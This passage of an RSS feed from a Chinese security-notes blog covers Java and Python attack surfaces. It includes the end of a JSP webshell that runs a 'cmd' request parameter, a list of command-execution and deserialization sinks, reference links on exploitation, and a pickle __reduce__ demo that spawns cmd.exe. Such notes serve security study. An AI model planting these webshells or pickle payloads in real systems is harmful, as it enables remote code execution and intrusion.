class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;loadClass&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;shell&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getConstructor&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;newInstance&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;request&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getParameter&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;cmd&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;toString&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getBytes&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;执行命令变式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#执行命令变式&#34;&gt;#&lt;/a&gt; 执行命令变式&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;java.lang.ProcessBuilder#start&lt;/li&gt;
&lt;li&gt;java.lang.Runtime#exec&lt;/li&gt;
&lt;li&gt;TemplatesImpl&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;基于反射&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基于反射&#34;&gt;#&lt;/a&gt; 基于反射&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;class.forName&lt;/li&gt;
&lt;li&gt;MethodAccessor.invoke&lt;/li&gt;
&lt;li&gt;Method.invoke&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;其他shell变式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#其他shell变式&#34;&gt;#&lt;/a&gt; 其他 Shell 变式&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;java.beans.Expression&lt;/li&gt;
&lt;li&gt;java.lang.ClassLoader&lt;/li&gt;
&lt;li&gt;java.net.URLClassLoader&lt;/li&gt;
&lt;li&gt;jdk.nashorn.internal.runtime.ScriptLoader&lt;/li&gt;
&lt;li&gt;ObjectInputStream.resolveClass&lt;/li&gt;
&lt;li&gt;ScriptEngine.eval&lt;/li&gt;
&lt;li&gt;ScriptEngineManager&lt;/li&gt;
&lt;li&gt;ToolProvider.getSystemJavaCompiler&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;tomcat-容器&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#tomcat-容器&#34;&gt;#&lt;/a&gt; Tomcat 容器&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Servlet&lt;/li&gt;
&lt;li&gt;Filter&lt;/li&gt;
&lt;li&gt;Listener&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;h2 id=&#34;官方文档&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#官方文档&#34;&gt;#&lt;/a&gt; 官方文档&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2NvbW1vbnMuYXBhY2hlLm9yZy9wcm9wZXIvY29tbW9ucy1vZ25sLw==&#34;&gt;ognl&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kb2NzLm9yYWNsZS5jb20vamF2YXNlLzkvc2VjdXJpdHkvdG9jLmh0bQ==&#34;&gt;Java SE Security Guide&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kb2NzLm9yYWNsZS5jb20vamF2YXNlLzcvZG9jcy90ZWNobm90ZXMvZ3VpZGVzL3JtaS9yZWxub3Rlcy5odG1s&#34;&gt;Java RMI Release Notes for JDK 6&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cub3JhY2xlLmNvbS90ZWNobmV0d29yay9qYXZhL2phdmFzZS83dTIxLXJlbG5vdGVzLTE5MzI4NzMuaHRtbA==&#34;&gt;Java Release Notes for JDK 7&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;机制说明&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#机制说明&#34;&gt;#&lt;/a&gt; 机制说明&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vY3p3YmlnL3AvMTExMjcyMjIuaHRtbA==&#34;&gt;深入理解 Java 类加载&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;反序列化-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#反序列化-3&#34;&gt;#&lt;/a&gt; 反序列化&lt;/h2&gt;
&lt;h3 id=&#34;标准&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#标准&#34;&gt;#&lt;/a&gt; 标准&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpbGVudGJhbGFuY2V5aC9hcnRpY2xlL2RldGFpbHMvODE4Mzg0OQ==&#34;&gt;Java 序列化【草案一】&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kb2NzLm9yYWNsZS5jb20vZW4vamF2YS9qYXZhc2UvMTQvZG9jcy9zcGVjcy9zZXJpYWxpemF0aW9uL2luZGV4Lmh0bWw=&#34;&gt;Java 14 Object Serialization Specification&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;利用与技巧&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用与技巧&#34;&gt;#&lt;/a&gt; 利用与技巧&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuc2xpZGVzaGFyZS5uZXQvZnJvaG9mZjEvYXBwc2VjY2FsaS0yMDE1LW1hcnNoYWxsaW5nLXBpY2tsZXM=&#34;&gt;Marshalling Pickles how deserializing objects can ruin your day&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9mcm9ob2ZmLmdpdGh1Yi5pby9hcHBzZWNjYWxpLW1hcnNoYWxsaW5nLXBpY2tsZXMv&#34;&gt;AppSecCali 2015: Marshalling Pickles&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3dvdXRlci5jb2VrYWVydHMuYmUvMjAxNS9hbm5vdGF0aW9uaW52b2NhdGlvbmhhbmRsZXI=&#34;&gt;More serialization hacks with AnnotationInvocationHandler&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3B3bnRlc3Rlci9KUkU4dTIwX1JDRV9HYWRnZXQ=&#34;&gt;Pure JRE 8 RCE Deserialization gadget&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3NsaWdodGx5cmFuZG9tYnJva2VudGhvdWdodHMuYmxvZ3Nwb3QuY29tLzIwMTAvMDgvYnJlYWtpbmctZGVmZW5zaXZlLXNlcmlhbGl6YXRpb24uaHRtbA==&#34;&gt;Breaking Defensive Serialization&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3Mvbk5UdzNITW5rWDYzZDl5YmR4M1VTUQ==&#34;&gt;Java 反序列化漏洞从入门到深入&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNoYWl0aW4uY24vMjAxNS0xMS0xMV9qYXZhX3Vuc2VyaWFsaXplX3JjZS8=&#34;&gt;Java 反序列化漏洞通用利用分析&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5mcmVlYnVmLmNvbS92dWxzLzE3NjY3Mi5odG1s&#34;&gt;JRE8u20 反序列化漏洞分析&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMzg0Nw==&#34;&gt;浅析 Java 序列化和反序列化&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zZWN1cml0eS50ZW5jZW50LmNvbS9pbmRleC5waHAvYmxvZy9tc2cvOTc=&#34;&gt;Commons Collections Java 反序列化漏洞深入分析&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmJsYWNraGF0LmNvbS9ldS0xOS9XZWRuZXNkYXkvZXUtMTktQW4tRmFyLVNpZGVzLU9mLUphdmEtUmVtb3RlLVByb3RvY29scy5wZGY=&#34;&gt;FAR SIDES OF JAVA REMOTE PROTOCOLS&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvM2JKNjY4R1ZiMzluVDBORFZELTNJQQ==&#34;&gt;JDK8u20 反序列化漏洞新型 PoC 思路及具体实现&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2Jsb2cub3JhbmdlLnR3LzIwMTgvMDMvcHduLWN0Zi1wbGF0Zm9ybS13aXRoLWphdmEtanJtcC1nYWRnZXQuaHRtbA==&#34;&gt;Pwn a CTF Platform with Java JRMP Gadget&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ub3NlYy5vcmcvaG9tZS9kZXRhaWwvNDg0Ni5odG1s&#34;&gt;漫谈 JEP 290&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;框架-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#框架-2&#34;&gt;#&lt;/a&gt; 框架&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzE2OTc3MC5odG1s&#34;&gt;WebLogic 反序列化漏洞漫谈&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jZXJ0LjM2MC5jbi9yZXBvcnQvZGV0YWlsP2lkPWM4ZWVkNGIzNmZlOGIxOWM1ODVhMTgxN2I1ZjEwYjll&#34;&gt;从 WebLogic 看反序列化漏洞的利用与防御&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3NoZW5ncWkxNTgvZmFzdGpzb24tcmVtb3RlLWNvZGUtZXhlY3V0ZS1wb2MvYmxvYi9tYXN0ZXIvSmF2YV9KU09OJUU1JThGJThEJUU1JUJBJThGJUU1JTg4JTk3JUU1JThDJTk2JUU0JUI5JThCJUU2JUFFJTg3XyVFNyU5QyU4QiVFOSU5QiVBQSVFNSVBRSU4OSVFNSU4NSVBOCVFNSVCQyU4MCVFNSU4RiU5MSVFOCU4MCU4NSVFNSVCMyVCMCVFNCVCQyU5QS5wZGY=&#34;&gt;JSON 反序列化之殇&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3Mval9neDlDX3hMMUx5cm51RkZQRnNmZw==&#34;&gt;Shiro 组件漏洞与攻击链分析&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuaW5mb3EuY29tL2FydGljbGVzL2FwYWNoZS1zaGlyby8=&#34;&gt;Application Security With Apache Shiro&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC81NDE3Njk1Ng==&#34;&gt;Shiro 安全框架【快速入门】&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xMzY3NzAy&#34;&gt;Shiro 实战 (四) - 过滤器机制&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;沙箱-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#沙箱-2&#34;&gt;#&lt;/a&gt; 沙箱&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3BocmFjay5vcmcvcGFwZXJzL2VzY2FwaW5nX3RoZV9qYXZhX3NhbmRib3guaHRtbA==&#34;&gt;Java Sandbox Escape&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;框架-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#框架-3&#34;&gt;#&lt;/a&gt; 框架&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2FwYWNoZS9zdHJ1dHM=&#34;&gt;Struts&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2FwYWNoZS9zdHJ1dHMtZXhhbXBsZXM=&#34;&gt;Struts Examples&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2VjbGlwc2UvamV0dHkucHJvamVjdA==&#34;&gt;Eclipse Jetty&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0xhbmRHcmV5L1NwcmluZ0Jvb3RWdWxFeHBsb2l0&#34;&gt;SpringBootVulExploit&lt;/span&gt; SpringBoot 相关漏洞学习资料，利用方法和技巧合集，黑盒安全评估 checklist&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;框架利用技巧&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#框架利用技巧&#34;&gt;#&lt;/a&gt; 框架利用技巧&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9sYW5kZ3JleS5tZS9ibG9nLzIyLw==&#34;&gt;Spring Boot Fat Jar 写文件漏洞到稳定 RCE 的探索&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;rmi-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#rmi-2&#34;&gt;#&lt;/a&gt; RMI&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20veWdqMDkzMC9wLzY1NDI4MTEuaHRtbA==&#34;&gt;Java RMI 与 RPC 的区别&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cub3JlaWxseS5jb20vbGlicmFyeS92aWV3L2xlYXJuaW5nLWphdmEvMTU2NTkyNzE4NC9jaDExczA0Lmh0bWw=&#34;&gt;Remote Method Invocation (RMI)&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wYXBlci5zZWVidWcub3JnLzEwOTE=&#34;&gt;Java 中 RMI、JNDI、LADP、JRMP、JMX、JMS 那些事儿&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2RvY3Mub3JhY2xlLmNvbS9jZC9FMTEwMzVfMDEvd2xzMTAwL2NsaWVudC90My5odG1s&#34;&gt;Oracle: Developing T3 Clients&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;jndi-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jndi-2&#34;&gt;#&lt;/a&gt; JNDI&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kb2NzLm9yYWNsZS5jb20vamF2YXNlL3R1dG9yaWFsL2puZGkvb3ZlcnZpZXcvaW5kZXguaHRtbA==&#34;&gt;Overview of JNDI&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wYXBlci5zZWVidWcub3JnLzQxNy8=&#34;&gt;关于 JNDI 注入&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYmxhY2toYXQuY29tL2RvY3MvdXMtMTYvbWF0ZXJpYWxzL3VzLTE2LU11bm96LUEtSm91cm5leS1Gcm9tLUpOREktTERBUC1NYW5pcHVsYXRpb24tVG8tUkNFLnBkZg==&#34;&gt;A Journey From JNDI LDAP Manipulation To RCE&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vY29sdW1uLzIwNzQzOS5odG1s&#34;&gt;如何绕过高版本 JDK 的限制进行 JNDI 注入&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;webshell-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#webshell-2&#34;&gt;#&lt;/a&gt; WebShell&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNzc5OA==&#34;&gt;各种姿势 jsp webshell&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;其他漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#其他漏洞&#34;&gt;#&lt;/a&gt; 其他漏洞&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93ZWJzZWMucmVhZHRoZWRvY3MuaW8vemgvbGF0ZXN0L2xhbmd1YWdlL2phdmEvYmxvZy5zcG9vY2suY29tLzIwMTgvMTAvMjMvamF2YS14eGUvaW5kZXguaHRtbA==&#34;&gt;JAVA 常见的 XXE 漏洞写法和防御&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/Python/</guid>
            <title>Python</title>
            <link>https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/Python/</link>
            <category>语言</category>
            <category>反序列化</category>
            <category>混淆</category>
            <category>沙箱</category>
            <category>Python</category>
            <pubDate>Sun, 27 Nov 2022 16:42:11 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;格式化字符串&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#格式化字符串&#34;&gt;#&lt;/a&gt; 格式化字符串&lt;/h1&gt;
&lt;p&gt;在 Python 中，有两种格式化字符串的方式，在 Python2 的较低版本中，格式化字符串的方式为  &lt;code&gt;&amp;quot;this is a %s&amp;quot; % &amp;quot;test&amp;quot;&lt;/code&gt;  ，之后增加了 format 的方式， 语法为  &lt;code&gt;&amp;quot;this is a &amp;#123;&amp;#125;&amp;quot;.format(&#39;test&#39;)&lt;/code&gt;  或者  &lt;code&gt;&amp;quot;this is a &amp;#123;test&amp;#125;&amp;quot;.format(test=&#39;test&#39;)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;当格式化字符串由用户输入时，则可能会造成一些问题，下面是一个最简单的例子&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; &#39;class of &amp;#123;0&amp;#125; is &amp;#123;0.__class__&amp;#125;&#39;.format(42)
&amp;quot;class of 42 is &amp;lt;class &#39;int&#39;&amp;gt;&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;从上面这个简单的例子不难知道，当我们可以控制要 format 的字符串时，则可以使用  &lt;code&gt;__init__&lt;/code&gt;  /  &lt;code&gt;__globals__&lt;/code&gt;  等属性读取一些比较敏感的值，甚至任意执行代码。&lt;/p&gt;
&lt;h1 id=&#34;反序列化&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#反序列化&#34;&gt;#&lt;/a&gt; 反序列化&lt;/h1&gt;
&lt;h2 id=&#34;pickle-demo&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pickle-demo&#34;&gt;#&lt;/a&gt; pickle demo&lt;/h2&gt;
&lt;p&gt;Python Pickle 在反序列化时会调用  &lt;code&gt;__reduce__&lt;/code&gt;  ，可用自定义的  &lt;code&gt;__reduce__&lt;/code&gt;  函数来实现攻击。&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; pickle&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; pickletools&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; subprocess&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;object&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    a &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    b &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;__reduce__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;subprocess&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;Popen&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;cmd.exe&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;data &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; pickle&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;dumps&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;A&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;pickletools&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;dis&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;data&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;其他序列化库&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#其他序列化库&#34;&gt;#&lt;/a&gt; 其他序列化库&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;PyYAML&lt;/li&gt;
&lt;li&gt;marshal&lt;/li&gt;
&lt;li&gt;shelve&lt;/li&gt;
&lt;/ul&gt;
